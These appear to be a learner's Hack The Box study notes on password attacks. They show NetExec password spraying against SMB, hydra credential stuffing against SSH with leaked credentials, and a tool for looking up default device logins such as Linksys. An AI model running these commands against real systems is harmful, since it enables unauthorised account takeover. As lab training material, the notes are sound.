The attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default password. 

```shell-session
realCustampin@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
- We can use NetExec to brute force the smb client on our target using the default password 'ChangeMe123!'.

## Credential Stuffing

- An attacker uses one credential pair on one service and tries it on other services as well. 

```shell-session
realCustampin@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```
- Performing a credential stuffing attack on an SSH Target using credentials that were obtained from a database leak. 

## Default Credentials
- Network Devices and other applications come with default credentials, we can use the creds command below to view all the default credentials. 
```shell-session
realCustampin@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```

Once installed, here is the usage: 
```shell-session
realCustampin@htb[/htb]$ creds search linksys

| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
